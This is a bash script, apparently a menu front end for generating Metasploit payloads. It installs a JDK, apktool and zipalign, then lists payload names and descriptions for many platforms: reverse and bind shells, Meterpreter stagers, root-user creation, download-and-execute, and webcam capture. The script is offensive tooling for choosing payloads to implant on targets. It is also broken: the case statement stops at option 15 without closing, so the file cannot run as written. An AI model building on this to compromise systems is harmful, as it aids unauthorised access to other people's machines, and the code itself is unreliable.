#!/bin/bash

bold="\033[1m"
normal="\033[0m"
blue="\033[34m"
green="\033[32m"
red="\033[41m"

clear

echo -e "$bold $green ------------------------------------------------------------------------------- $normal"
echo
apt-get install default-jdk
echo
apt-get install apktool
echo
apt-get install zipalign


clear

echo -e "$bold $green ------------------------------------------------------------------------------- $normal"
echo -e "$blue $bold Choose Payload Type:$normal"
echo
echo "  1.  = Aix"
echo "  2.  = Android"
echo "  3.  = Apple_ios"
echo "  4.  = Bsd"
echo "  5.  = Bsdi"
echo "  6.  = Cmd"
echo "  7.  = Firefox"
echo "  8.  = Generic"
echo "  9.  = Java"
echo " 10. = Linux"
echo " 11. = Mainframe"
echo " 12. = Multi" 
echo " 13. = Netware"
echo " 14. = Nodejs"
echo " 15. = Osx"
echo " 16. = Php"
echo " 17. = Python"
echo " 18. = R"
echo " 19. = Ruby"
echo " 20. = Solaris"
echo " 21. = Tty"
echo " 22. = Windows"
echo "  0.  = Exit"
echo -e "$bold $green ------------------------------------------------------------------------------- $normal"

echo ">>>" && read payload

case $payload  in
	1) echo "    aix/ppc/shell_bind_tcp                 Listen for a connection and spawn a c
                                           ommand shell
    aix/ppc/shell_find_port                Spawn a shell on an established conne
                                           ction
    aix/ppc/shell_interact                 Simply execve /bin/sh (for inetd prog
                                           rams)
    aix/ppc/shell_reverse_tcp              Connect back to attacker and spawn a
                                           command shell" ;;
	2) echo "    android/meterpreter/reverse_http       Run a meterpreter server in Android.
                                           Tunnel communication over HTTP
    android/meterpreter/reverse_https      Run a meterpreter server in Android.
                                           Tunnel communication over HTTPS
    android/meterpreter/reverse_tcp        Run a meterpreter server in Android.
                                           Connect back stager
    android/meterpreter_reverse_http       Connect back to attacker and spawn a
                                           Meterpreter shell
    android/meterpreter_reverse_https      Connect back to attacker and spawn a
                                           Meterpreter shell
    android/meterpreter_reverse_tcp        Connect back to the attacker and spaw
                                           n a Meterpreter shell
    android/shell/reverse_http             Spawn a piped command shell (sh). Tun
                                           nel communication over HTTP
    android/shell/reverse_https            Spawn a piped command shell (sh). Tun
                                           nel communication over HTTPS
    android/shell/reverse_tcp              Spawn a piped command shell (sh). Con
                                           nect back stager
" ;;
	3) echo "    apple_ios/aarch64/meterpreter_revers  Run the Meterpreter / Mettle server p
    e_http                                ayload (stageless)
    apple_ios/aarch64/meterpreter_revers  Run the Meterpreter / Mettle server p
    e_https                               ayload (stageless)
    apple_ios/aarch64/meterpreter_revers  Run the Meterpreter / Mettle server p
    e_tcp                                 ayload (stageless)
    apple_ios/aarch64/shell_reverse_tcp   Connect back to attacker and spawn a
                                          command shell
    apple_ios/armle/meterpreter_reverse_  Run the Meterpreter / Mettle server p
    http                                  ayload (stageless)
    apple_ios/armle/meterpreter_reverse_  Run the Meterpreter / Mettle server p
    https                                 ayload (stageless)
    apple_ios/armle/meterpreter_reverse_  Run the Meterpreter / Mettle server p
    tcp                                   ayload (stageless)
";;
	4) echo "    bsd/sparc/shell_bind_tcp              Listen for a connection and spawn a c
                                          ommand shell
    bsd/sparc/shell_reverse_tcp           Connect back to attacker and spawn a
                                          command shell
    bsd/vax/shell_reverse_tcp             Connect back to attacker and spawn a
                                          command shell
    bsd/x64/exec                          Execute an arbitrary command
    bsd/x64/shell_bind_ipv6_tcp           Listen for a connection and spawn a c
                                          ommand shell over IPv6
    bsd/x64/shell_bind_tcp                Bind an arbitrary command to an arbit
                                          rary port
    bsd/x64/shell_bind_tcp_small          Listen for a connection and spawn a c
                                          ommand shell
    bsd/x64/shell_reverse_ipv6_tcp        Connect back to attacker and spawn a
                                          command shell over IPv6
    bsd/x64/shell_reverse_tcp             Connect back to attacker and spawn a
                                          command shell
    bsd/x64/shell_reverse_tcp_small       Connect back to attacker and spawn a
                                          command shell
    bsd/x86/exec                          Execute an arbitrary command
    bsd/x86/metsvc_bind_tcp               Stub payload for interacting with a M
                                          eterpreter Service
    bsd/x86/metsvc_reverse_tcp            Stub payload for interacting with a M
                                          eterpreter Service
    bsd/x86/shell/bind_ipv6_tcp           Spawn a command shell (staged). Liste
                                          n for a connection over IPv6
    bsd/x86/shell/bind_tcp                Spawn a command shell (staged). Liste
                                          n for a connection
    bsd/x86/shell/find_tag                Spawn a command shell (staged). Use a
                                          n established connection
    bsd/x86/shell/reverse_ipv6_tcp        Spawn a command shell (staged). Conne
                                          ct back to the attacker over IPv6
    bsd/x86/shell/reverse_tcp             Spawn a command shell (staged). Conne
                                          ct back to the attacker
    bsd/x86/shell_bind_tcp                Listen for a connection and spawn a c
                                          ommand shell
    bsd/x86/shell_bind_tcp_ipv6           Listen for a connection and spawn a c
                                          ommand shell over IPv6
    bsd/x86/shell_find_port               Spawn a shell on an established conne
                                          ction
    bsd/x86/shell_find_tag                Spawn a shell on an established conne
                                          ction (proxy/nat safe)
    bsd/x86/shell_reverse_tcp             Connect back to attacker and spawn a
                                          command shell
    bsd/x86/shell_reverse_tcp_ipv6        Connect back to attacker and spawn a
                                          command shell over IPv6
";;
	5) echo "    bsdi/x86/shell/bind_tcp               Spawn a command shell (staged). Liste
                                          n for a connection
    bsdi/x86/shell/reverse_tcp            Spawn a command shell (staged). Conne
                                          ct back to the attacker
    bsdi/x86/shell_bind_tcp               Listen for a connection and spawn a c
                                          ommand shell
    bsdi/x86/shell_find_port              Spawn a shell on an established conne
                                          ction
    bsdi/x86/shell_reverse_tcp            Connect back to attacker and spawn a
                                          command shell
";;
	6) echo "    cmd/mainframe/apf_privesc_jcl         (Elevate privileges for user. Adds SY
                                          STEM SPECIAL and BPX.SUPERUSER to use
                                          r profile. Does this by using an unse
                                          cured/updateable APF authorized libra
                                          ry (APFLIB) and updating the user's A
                                          CEE using this program/library. Note:
                                           This privesc only works with z/OS sy
                                          stems using RACF, no other ESM is sup
                                          ported.)
    cmd/mainframe/bind_shell_jcl          Provide JCL which creates a bind shel
                                          l This implmentation does not include
                                           ebcdic character translation, so a c
                                          lient with translation capabilities i
                                          s required. MSF handles this automati
                                          cally.
    cmd/mainframe/generic_jcl             Provide JCL which can be used to subm
                                          it a job to JES2 on z/OS which will e
                                          xit and return 0. This can be used as
                                           a template for other JCL based paylo
                                          ads
    cmd/mainframe/reverse_shell_jcl       Provide JCL which creates a reverse s
                                          hell This implementation does not inc
                                          lude ebcdic character translation, so
                                           a client with translation capabiliti
                                          es is required. MSF handles this auto
                                          matically.
    cmd/unix/bind_awk                     Listen for a connection and spawn a c
                                          ommand shell via GNU AWK
    cmd/unix/bind_busybox_telnetd         Listen for a connection and spawn a c
                                          ommand shell via BusyBox telnetd
    cmd/unix/bind_inetd                   Listen for a connection and spawn a c
                                          ommand shell (persistent)
    cmd/unix/bind_jjs                     Listen for a connection and spawn a c
                                          ommand shell via jjs
    cmd/unix/bind_lua                     Listen for a connection and spawn a c
                                          ommand shell via Lua
    cmd/unix/bind_netcat                  Listen for a connection and spawn a c
                                          ommand shell via netcat
    cmd/unix/bind_netcat_gaping           Listen for a connection and spawn a c
                                          ommand shell via netcat
    cmd/unix/bind_netcat_gaping_ipv6      Listen for a connection and spawn a c
                                          ommand shell via netcat
    cmd/unix/bind_nodejs                  Continually listen for a connection a
                                          nd spawn a command shell via nodejs
    cmd/unix/bind_perl                    Listen for a connection and spawn a c
                                          ommand shell via perl
    cmd/unix/bind_perl_ipv6               Listen for a connection and spawn a c
                                          ommand shell via perl
    cmd/unix/bind_r                       Continually listen for a connection a
                                          nd spawn a command shell via R
    cmd/unix/bind_ruby                    Continually listen for a connection a
                                          nd spawn a command shell via Ruby
    cmd/unix/bind_ruby_ipv6               Continually listen for a connection a
                                          nd spawn a command shell via Ruby
    cmd/unix/bind_socat_udp               Creates an interactive shell via soca
                                          t
    cmd/unix/bind_stub                    Listen for a connection and spawn a c
                                          ommand shell (stub only, no payload)
    cmd/unix/bind_zsh                     Listen for a connection and spawn a c
                                          ommand shell via Zsh. Note: Although
                                          Zsh is often available, please be awa
                                          re it isn't usually installed by defa
                                          ult.
    cmd/unix/generic                      Executes the supplied command
    cmd/unix/interact                     Interacts with a shell on an establis
                                          hed socket connection
    cmd/unix/pingback_bind                Accept a connection, send a UUID, the
                                          n exit
    cmd/unix/pingback_reverse             Creates a socket, send a UUID, then e
                                          xit
    cmd/unix/reverse                      Creates an interactive shell through
                                          two inbound connections
    cmd/unix/reverse_awk                  Creates an interactive shell via GNU
                                          AWK
    cmd/unix/reverse_bash                 Creates an interactive shell via bash
                                          's builtin /dev/tcp. This will not wo
                                          rk on circa 2009 and older Debian-bas
                                          ed Linux distributions (including Ubu
                                          ntu) because they compile bash withou
                                          t the /dev/tcp feature.
    cmd/unix/reverse_bash_telnet_ssl      Creates an interactive shell via mkfi
                                          fo and telnet. This method works on D
                                          ebian and other systems compiled with
                                          out /dev/tcp support. This module use
                                          s the '-z' option included on some sy
                                          stems to encrypt using SSL.
    cmd/unix/reverse_bash_udp             Creates an interactive shell via bash
                                          's builtin /dev/udp. This will not wo
                                          rk on circa 2009 and older Debian-bas
                                          ed Linux distributions (including Ubu
                                          ntu) because they compile bash withou
                                          t the /dev/udp feature.
    cmd/unix/reverse_jjs                  Connect back and create a command she
                                          ll via jjs
    cmd/unix/reverse_ksh                  Connect back and create a command she
                                          ll via Ksh. Note: Although Ksh is oft
                                          en available, please be aware it isn'
                                          t usually installed by default.
    cmd/unix/reverse_lua                  Creates an interactive shell via Lua
    cmd/unix/reverse_ncat_ssl             Creates an interactive shell via ncat
                                          , utilizing ssl mode
    cmd/unix/reverse_netcat               Creates an interactive shell via netc
                                          at
    cmd/unix/reverse_netcat_gaping        Creates an interactive shell via netc
                                          at
    cmd/unix/reverse_nodejs               Continually listen for a connection a
                                          nd spawn a command shell via nodejs
    cmd/unix/reverse_openssl              Creates an interactive shell through
                                          two inbound connections
    cmd/unix/reverse_perl                 Creates an interactive shell via perl
    cmd/unix/reverse_perl_ssl             Creates an interactive shell via perl
                                          , uses SSL
    cmd/unix/reverse_php_ssl              Creates an interactive shell via php,
                                           uses SSL
    cmd/unix/reverse_python               Connect back and create a command she
                                          ll via Python
    cmd/unix/reverse_python_ssl           Creates an interactive shell via pyth
                                          on, uses SSL, encodes with base64 by
                                          design.
    cmd/unix/reverse_r                    Connect back and create a command she
                                          ll via R
    cmd/unix/reverse_ruby                 Connect back and create a command she
                                          ll via Ruby
    cmd/unix/reverse_ruby_ssl             Connect back and create a command she
                                          ll via Ruby, uses SSL
    cmd/unix/reverse_socat_udp            Creates an interactive shell via soca
                                          t
    cmd/unix/reverse_ssh                  Connect back and create a command she
                                          ll via SSH
    cmd/unix/reverse_ssl_double_telnet    Creates an interactive shell through
                                          two inbound connections, encrypts usi
                                          ng SSL via "-z" option
    cmd/unix/reverse_stub                 Creates an interactive shell through
                                          an inbound connection (stub only, no
                                          payload)
    cmd/unix/reverse_tclsh                Creates an interactive shell via Tcls
                                          h
    cmd/unix/reverse_zsh                  Connect back and create a command she
                                          ll via Zsh. Note: Although Zsh is oft
                                          en available, please be aware it isn'
                                          t usually installed by default.
    cmd/windows/adduser                   Create a new user and add them to loc
                                          al administration group. Note: The sp
                                          ecified password is checked for commo
                                          n complexity requirements to prevent
                                          the target machine rejecting the user
                                           for failing to meet policy requireme
                                          nts. Complexity check: 8-14 chars (1
                                          UPPER, 1 lower, 1 digit/special)
    cmd/windows/bind_lua                  Listen for a connection and spawn a c
                                          ommand shell via Lua
    cmd/windows/bind_perl                 Listen for a connection and spawn a c
                                          ommand shell via perl (persistent)
    cmd/windows/bind_perl_ipv6            Listen for a connection and spawn a c
                                          ommand shell via perl (persistent)
    cmd/windows/bind_ruby                 Continually listen for a connection a
                                          nd spawn a command shell via Ruby
    cmd/windows/download_eval_vbs         Downloads a file from an HTTP(S) URL
                                          and executes it as a vbs script. Use
                                          it to stage a vbs encoded payload fro
                                          m a short command line.
    cmd/windows/download_exec_vbs         Download an EXE from an HTTP(S) URL a
                                          nd execute it
    cmd/windows/generic                   Executes the supplied command
    cmd/windows/powershell_bind_tcp       Interacts with a powershell session o
                                          n an established socket connection
    cmd/windows/powershell_reverse_tcp    Interacts with a powershell session o
                                          n an established socket connection
    cmd/windows/powershell_reverse_tcp_s  Interacts with a powershell session o
    sl                                    n an established SSL socket connectio
                                          n
    cmd/windows/reverse_lua               Creates an interactive shell via Lua
    cmd/windows/reverse_perl              Creates an interactive shell via perl
    cmd/windows/reverse_powershell        Connect back and create a command she
                                          ll via Powershell
    cmd/windows/reverse_ruby              Connect back and create a command she
                                          ll via Ruby
";;
	7) echo "    firefox/exec                          This module runs a shell command on t
                                          he target OS without touching the dis
                                          k. On Windows, this command will flas
                                          h the command prompt momentarily. Thi
                                          s can be avoided by setting WSCRIPT t
                                          o true, which drops a jscript 'launch
                                          er' to disk that hides the prompt.
    firefox/shell_bind_tcp                Creates an interactive shell via Java
                                          script with access to Firefox's XPCOM
                                           API
    firefox/shell_reverse_tcp             Creates an interactive shell via Java
                                          script with access to Firefox's XPCOM
                                           API
";;
	8) echo "    generic/custom                        Use custom string or file as payload.
                                           Set either PAYLOADFILE or PAYLOADSTR
                                          .
    generic/debug_trap                    Generate a debug trap in the target p
                                          rocess
    generic/shell_bind_tcp                Listen for a connection and spawn a c
                                          ommand shell
    generic/shell_reverse_tcp             Connect back to attacker and spawn a
                                          command shell
    generic/ssh/interact                  Interacts with a shell on an establis
                                          hed SSH connection
    generic/tight_loop                    Generate a tight loop in the target p
                                          rocess
";;
	9) echo "    java/jsp_shell_bind_tcp               Listen for a connection and spawn a c
                                          ommand shell
    java/jsp_shell_reverse_tcp            Connect back to attacker and spawn a
                                          command shell
    java/meterpreter/bind_tcp             Run a meterpreter server in Java. Lis
                                          ten for a connection
    java/meterpreter/reverse_http         Run a meterpreter server in Java. Tun
                                          nel communication over HTTP
    java/meterpreter/reverse_https        Run a meterpreter server in Java. Tun
                                          nel communication over HTTPS
    java/meterpreter/reverse_tcp          Run a meterpreter server in Java. Con
                                          nect back stager
    java/shell/bind_tcp                   Spawn a piped command shell (cmd.exe
                                          on Windows, /bin/sh everywhere else).
                                           Listen for a connection
    java/shell/reverse_tcp                Spawn a piped command shell (cmd.exe
                                          on Windows, /bin/sh everywhere else).
                                           Connect back stager
    java/shell_reverse_tcp                Connect back to attacker and spawn a
                                          command shell
";;
	10) echo "    linux/aarch64/meterpreter/reverse_tc  Inject the mettle server payload (sta
    p                                     ged). Connect back to the attacker
    linux/aarch64/meterpreter_reverse_ht  Run the Meterpreter / Mettle server p
    tp                                    ayload (stageless)
    linux/aarch64/meterpreter_reverse_ht  Run the Meterpreter / Mettle server p
    tps                                   ayload (stageless)
    linux/aarch64/meterpreter_reverse_tc  Run the Meterpreter / Mettle server p
    p                                     ayload (stageless)
    linux/aarch64/shell/reverse_tcp       dup2 socket in x12, then execve. Conn
                                          ect back to the attacker
    linux/aarch64/shell_reverse_tcp       Connect back to attacker and spawn a
                                          command shell
    linux/armbe/meterpreter_reverse_http  Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    linux/armbe/meterpreter_reverse_http  Run the Meterpreter / Mettle server p
    s                                     ayload (stageless)
    linux/armbe/meterpreter_reverse_tcp   Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    linux/armbe/shell_bind_tcp            Listen for a connection and spawn a c
                                          ommand shell
    linux/armle/adduser                   Create a new user with UID 0
    linux/armle/exec                      Execute an arbitrary command
    linux/armle/meterpreter/bind_tcp      Inject the mettle server payload (sta
                                          ged). Listen for a connection
    linux/armle/meterpreter/reverse_tcp   Inject the mettle server payload (sta
                                          ged). Connect back to the attacker
    linux/armle/meterpreter_reverse_http  Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    linux/armle/meterpreter_reverse_http  Run the Meterpreter / Mettle server p
    s                                     ayload (stageless)
    linux/armle/meterpreter_reverse_tcp   Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    linux/armle/shell/bind_tcp            dup2 socket in r12, then execve. List
                                          en for a connection
    linux/armle/shell/reverse_tcp         dup2 socket in r12, then execve. Conn
                                          ect back to the attacker
    linux/armle/shell_bind_tcp            Connect to target and spawn a command
                                           shell
    linux/armle/shell_reverse_tcp         Connect back to attacker and spawn a
                                          command shell
    linux/mips64/meterpreter_reverse_htt  Run the Meterpreter / Mettle server p
    p                                     ayload (stageless)
    linux/mips64/meterpreter_reverse_htt  Run the Meterpreter / Mettle server p
    ps                                    ayload (stageless)
    linux/mips64/meterpreter_reverse_tcp  Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    linux/mipsbe/exec                     A very small shellcode for executing
                                          commands. This module is sometimes he
                                          lpful for testing purposes.
    linux/mipsbe/meterpreter/reverse_tcp  Inject the mettle server payload (sta
                                          ged). Connect back to the attacker
    linux/mipsbe/meterpreter_reverse_htt  Run the Meterpreter / Mettle server p
    p                                     ayload (stageless)
    linux/mipsbe/meterpreter_reverse_htt  Run the Meterpreter / Mettle server p
    ps                                    ayload (stageless)
    linux/mipsbe/meterpreter_reverse_tcp  Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    linux/mipsbe/reboot                   A very small shellcode for rebooting
                                          the system. This payload is sometimes
                                           helpful for testing purposes or exec
                                          uting other payloads that rely on ini
                                          tial startup procedures.
    linux/mipsbe/shell/reverse_tcp        Spawn a command shell (staged). Conne
                                          ct back to the attacker
    linux/mipsbe/shell_bind_tcp           Listen for a connection and spawn a c
                                          ommand shell
    linux/mipsbe/shell_reverse_tcp        Connect back to attacker and spawn a
                                          command shell
    linux/mipsle/exec                     A very small shellcode for executing
                                          commands. This module is sometimes he
                                          lpful for testing purposes as well as
                                           on targets with extremely limited bu
                                          ffer space.
    linux/mipsle/meterpreter/reverse_tcp  Inject the mettle server payload (sta
                                          ged). Connect back to the attacker
    linux/mipsle/meterpreter_reverse_htt  Run the Meterpreter / Mettle server p
    p                                     ayload (stageless)
    linux/mipsle/meterpreter_reverse_htt  Run the Meterpreter / Mettle server p
    ps                                    ayload (stageless)
    linux/mipsle/meterpreter_reverse_tcp  Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    linux/mipsle/reboot                   A very small shellcode for rebooting
                                          the system. This payload is sometimes
                                           helpful for testing purposes.
    linux/mipsle/shell/reverse_tcp        Spawn a command shell (staged). Conne
                                          ct back to the attacker
    linux/mipsle/shell_bind_tcp           Listen for a connection and spawn a c
                                          ommand shell
    linux/mipsle/shell_reverse_tcp        Connect back to attacker and spawn a
                                          command shell
    linux/ppc/meterpreter_reverse_http    Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    linux/ppc/meterpreter_reverse_https   Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    linux/ppc/meterpreter_reverse_tcp     Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    linux/ppc/shell_bind_tcp              Listen for a connection and spawn a c
                                          ommand shell
    linux/ppc/shell_find_port             Spawn a shell on an established conne
                                          ction
    linux/ppc/shell_reverse_tcp           Connect back to attacker and spawn a
                                          command shell
    linux/ppc64/shell_bind_tcp            Listen for a connection and spawn a c
                                          ommand shell
    linux/ppc64/shell_find_port           Spawn a shell on an established conne
                                          ction
    linux/ppc64/shell_reverse_tcp         Connect back to attacker and spawn a
                                          command shell
    linux/ppc64le/meterpreter_reverse_ht  Run the Meterpreter / Mettle server p
    tp                                    ayload (stageless)
    linux/ppc64le/meterpreter_reverse_ht  Run the Meterpreter / Mettle server p
    tps                                   ayload (stageless)
    linux/ppc64le/meterpreter_reverse_tc  Run the Meterpreter / Mettle server p
    p                                     ayload (stageless)
    linux/ppce500v2/meterpreter_reverse_  Run the Meterpreter / Mettle server p
    http                                  ayload (stageless)
    linux/ppce500v2/meterpreter_reverse_  Run the Meterpreter / Mettle server p
    https                                 ayload (stageless)
    linux/ppce500v2/meterpreter_reverse_  Run the Meterpreter / Mettle server p
    tcp                                   ayload (stageless)
    linux/x64/exec                        Execute an arbitrary command or just
                                          a /bin/sh shell
    linux/x64/meterpreter/bind_tcp        Inject the mettle server payload (sta
                                          ged). Listen for a connection
    linux/x64/meterpreter/reverse_tcp     Inject the mettle server payload (sta
                                          ged). Connect back to the attacker
    linux/x64/meterpreter_reverse_http    Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    linux/x64/meterpreter_reverse_https   Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    linux/x64/meterpreter_reverse_tcp     Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    linux/x64/pingback_bind_tcp           Accept a connection from attacker and
                                           report UUID (Linux x64)
    linux/x64/pingback_reverse_tcp        Connect back to attacker and report U
                                          UID (Linux x64)
    linux/x64/shell/bind_tcp              Spawn a command shell (staged). Liste
                                          n for a connection
    linux/x64/shell/reverse_tcp           Spawn a command shell (staged). Conne
                                          ct back to the attacker
    linux/x64/shell_bind_ipv6_tcp         Listen for an IPv6 connection and spa
                                          wn a command shell
    linux/x64/shell_bind_tcp              Listen for a connection and spawn a c
                                          ommand shell
    linux/x64/shell_bind_tcp_random_port  Listen for a connection in a random p
                                          ort and spawn a command shell. Use nm
                                          ap to discover the open port: 'nmap -
                                          sS target -p-'.
    linux/x64/shell_find_port             Spawn a shell on an established conne
                                          ction
    linux/x64/shell_reverse_ipv6_tcp      Connect back to attacker and spawn a
                                          command shell over IPv6
    linux/x64/shell_reverse_tcp           Connect back to attacker and spawn a
                                          command shell
    linux/x86/adduser                     Create a new user with UID 0
    linux/x86/chmod                       Runs chmod on specified file with spe
                                          cified mode
    linux/x86/exec                        Execute an arbitrary command or just
                                          a /bin/sh shell
    linux/x86/meterpreter/bind_ipv6_tcp   Inject the mettle server payload (sta
                                          ged). Listen for an IPv6 connection (
                                          Linux x86)
    linux/x86/meterpreter/bind_ipv6_tcp_  Inject the mettle server payload (sta
    uuid                                  ged). Listen for an IPv6 connection w
                                          ith UUID Support (Linux x86)
    linux/x86/meterpreter/bind_nonx_tcp   Inject the mettle server payload (sta
                                          ged). Listen for a connection
    linux/x86/meterpreter/bind_tcp        Inject the mettle server payload (sta
                                          ged). Listen for a connection (Linux
                                          x86)
    linux/x86/meterpreter/bind_tcp_uuid   Inject the mettle server payload (sta
                                          ged). Listen for a connection with UU
                                          ID Support (Linux x86)
    linux/x86/meterpreter/find_tag        Inject the mettle server payload (sta
                                          ged). Use an established connection
    linux/x86/meterpreter/reverse_ipv6_t  Inject the mettle server payload (sta
    cp                                    ged). Connect back to attacker over I
                                          Pv6
    linux/x86/meterpreter/reverse_nonx_t  Inject the mettle server payload (sta
    cp                                    ged). Connect back to the attacker
    linux/x86/meterpreter/reverse_tcp     Inject the mettle server payload (sta
                                          ged). Connect back to the attacker
    linux/x86/meterpreter/reverse_tcp_uu  Inject the mettle server payload (sta
    id                                    ged). Connect back to the attacker
    linux/x86/meterpreter_reverse_http    Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    linux/x86/meterpreter_reverse_https   Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    linux/x86/meterpreter_reverse_tcp     Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    linux/x86/metsvc_bind_tcp             Stub payload for interacting with a M
                                          eterpreter Service
    linux/x86/metsvc_reverse_tcp          Stub payload for interacting with a M
                                          eterpreter Service
    linux/x86/read_file                   Read up to 4096 bytes from the local
                                          file system and write it back out to
                                          the specified file descriptor
    linux/x86/shell/bind_ipv6_tcp         Spawn a command shell (staged). Liste
                                          n for an IPv6 connection (Linux x86)
    linux/x86/shell/bind_ipv6_tcp_uuid    Spawn a command shell (staged). Liste
                                          n for an IPv6 connection with UUID Su
                                          pport (Linux x86)
    linux/x86/shell/bind_nonx_tcp         Spawn a command shell (staged). Liste
                                          n for a connection
    linux/x86/shell/bind_tcp              Spawn a command shell (staged). Liste
                                          n for a connection (Linux x86)
    linux/x86/shell/bind_tcp_uuid         Spawn a command shell (staged). Liste
                                          n for a connection with UUID Support
                                          (Linux x86)
    linux/x86/shell/find_tag              Spawn a command shell (staged). Use a
                                          n established connection
    linux/x86/shell/reverse_ipv6_tcp      Spawn a command shell (staged). Conne
                                          ct back to attacker over IPv6
    linux/x86/shell/reverse_nonx_tcp      Spawn a command shell (staged). Conne
                                          ct back to the attacker
    linux/x86/shell/reverse_tcp           Spawn a command shell (staged). Conne
                                          ct back to the attacker
    linux/x86/shell/reverse_tcp_uuid      Spawn a command shell (staged). Conne
                                          ct back to the attacker
    linux/x86/shell_bind_ipv6_tcp         Listen for a connection over IPv6 and
                                           spawn a command shell
    linux/x86/shell_bind_tcp              Listen for a connection and spawn a c
                                          ommand shell
    linux/x86/shell_bind_tcp_random_port  Listen for a connection in a random p
                                          ort and spawn a command shell. Use nm
                                          ap to discover the open port: 'nmap -
                                          sS target -p-'.
    linux/x86/shell_find_port             Spawn a shell on an established conne
                                          ction
    linux/x86/shell_find_tag              Spawn a shell on an established conne
                                          ction (proxy/nat safe)
    linux/x86/shell_reverse_tcp           Connect back to attacker and spawn a
                                          command shell
    linux/x86/shell_reverse_tcp_ipv6      Connect back to attacker and spawn a
                                          command shell over IPv6
    linux/zarch/meterpreter_reverse_http  Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    linux/zarch/meterpreter_reverse_http  Run the Meterpreter / Mettle server p
    s                                     ayload (stageless)
    linux/zarch/meterpreter_reverse_tcp   Run the Meterpreter / Mettle server p
                                          ayload (stageless)
";;
	11) echo "    mainframe/shell_reverse_tcp           Listen for a connection and spawn a c
                                          ommand shell. This implementation doe
                                          s not include ebcdic character transl
                                          ation, so a client with translation c
                                          apabilities is required. MSF handles
                                          this automatically.
";;
	12) echo "    multi/meterpreter/reverse_http        Handle Meterpreter sessions regardles
                                          s of the target arch/platform. Tunnel
                                           communication over HTTP
    multi/meterpreter/reverse_https       Handle Meterpreter sessions regardles
                                          s of the target arch/platform. Tunnel
                                           communication over HTTPS
";;
	13) echo "    netware/shell/reverse_tcp                Connect to the NetWare console (staged).
                                              Connect back to the attacker
";;
	14) echo "    nodejs/shell_bind_tcp                    Creates an interactive shell via nodejs
    nodejs/shell_reverse_tcp                 Creates an interactive shell via nodejs
    nodejs/shell_reverse_tcp_ssl             Creates an interactive shell via nodejs,
                                              uses SSL
";;
	15) echo "    osx/armle/execute/bind_tcp            Spawn a command shell (staged). Liste
                                          n for a connection
    osx/armle/execute/reverse_tcp         Spawn a command shell (staged). Conne
                                          ct back to the attacker
    osx/armle/shell/bind_tcp              Spawn a command shell (staged). Liste
                                          n for a connection
    osx/armle/shell/reverse_tcp           Spawn a command shell (staged). Conne
                                          ct back to the attacker
    osx/armle/shell_bind_tcp              Listen for a connection and spawn a c
                                          ommand shell
    osx/armle/shell_reverse_tcp           Connect back to attacker and spawn a
                                          command shell
    osx/armle/vibrate                     Causes the iPhone to vibrate, only wo
                                          rks when the AudioToolkit library has
                                           been loaded. Based on work by Charli
                                          e Miller <cmiller[at]securityevaluato
                                          rs.com>.
    osx/ppc/shell/bind_tcp                Spawn a command shell (staged). Liste
                                          n for a connection
    osx/ppc/shell/find_tag                Spawn a command shell (staged). Use a
                                          n established connection
    osx/ppc/shell/reverse_tcp             Spawn a command shell (staged). Conne
                                          ct back to the attacker
    osx/ppc/shell_bind_tcp                Listen for a connection and spawn a c
                                          ommand shell
    osx/ppc/shell_reverse_tcp             Connect back to attacker and spawn a
                                          command shell
    osx/x64/dupandexecve/bind_tcp         dup2 socket in edi, then execve. List
                                          en, read length, read buffer, execute
    osx/x64/dupandexecve/reverse_tcp      dup2 socket in edi, then execve. Conn
                                          ect, read length, read buffer, execut
                                          e
    osx/x64/dupandexecve/reverse_tcp_uui  dup2 socket in edi, then execve. Conn
    d                                     ect back to the attacker with UUID Su
                                          pport (OSX x64)
    osx/x64/exec                          Execute an arbitrary command
    osx/x64/meterpreter/bind_tcp          Inject the mettle server payload (sta
                                          ged). Listen, read length, read buffe
                                          r, execute
    osx/x64/meterpreter/reverse_tcp       Inject the mettle server payload (sta
                                          ged). Connect, read length, read buff
                                          er, execute
    osx/x64/meterpreter/reverse_tcp_uuid  Inject the mettle server payload (sta
                                          ged). Connect back to the attacker wi
                                          th UUID Support (OSX x64)
    osx/x64/meterpreter_reverse_http      Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    osx/x64/meterpreter_reverse_https     Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    osx/x64/meterpreter_reverse_tcp       Run the Meterpreter / Mettle server p
                                          ayload (stageless)
    osx/x64/say                           Say an arbitrary string outloud using
                                           Mac OS X text2speech
    osx/x64/shell_bind_tcp                Bind an arbitrary command to an arbit
                                          rary port
    osx/x64/shell_find_tag                Spawn a shell on an established conne
                                          ction (proxy/nat safe)
    osx/x64/shell_reverse_tcp             Connect back to attacker and spawn a
                                          command shell
    osx/x86/bundleinject/bind_tcp         Inject a custom Mach-O bundle into th
                                          e exploited process. Listen, read len
                                          gth, read buffer, execute
    osx/x86/bundleinject/reverse_tcp      Inject a custom Mach-O bundle into th
                                          e exploited process. Connect, read le
                                          ngth, read buffer, execute
    osx/x86/exec                          Execute an arbitrary command
    osx/x86/isight/bind_tcp               Inject a Mach-O bundle to capture a p
                                          hoto from the iSight (staged). Listen
                                          , read length, read buffer, execute
    osx/x86/isight/reverse_tcp            Inject a Mach-O bundle to capture a p
                                          hoto from the iSight (staged). Connec
                                          t, read length, read buffer, execute
    osx/x86/shell_bind_tcp                Listen for a connection and spawn a c
                                          ommand shell
    osx/x86/shell_find_port               Spawn a shell on an established conne
                                          ction
    osx/x86/shell_reverse_tcp             Connect back to attacker and spawn a
                                          command shell
    osx/x86/vforkshell/bind_tcp           Call vfork() if necessary and spawn a
                                           command shell (staged). Listen, read
                                           length, read buffer, execute
    osx/x86/vforkshell/reverse_tcp        Call vfork() if necessary and spawn a
                                           command shell (staged). Connect, rea
                                          d length, read buffer, execute
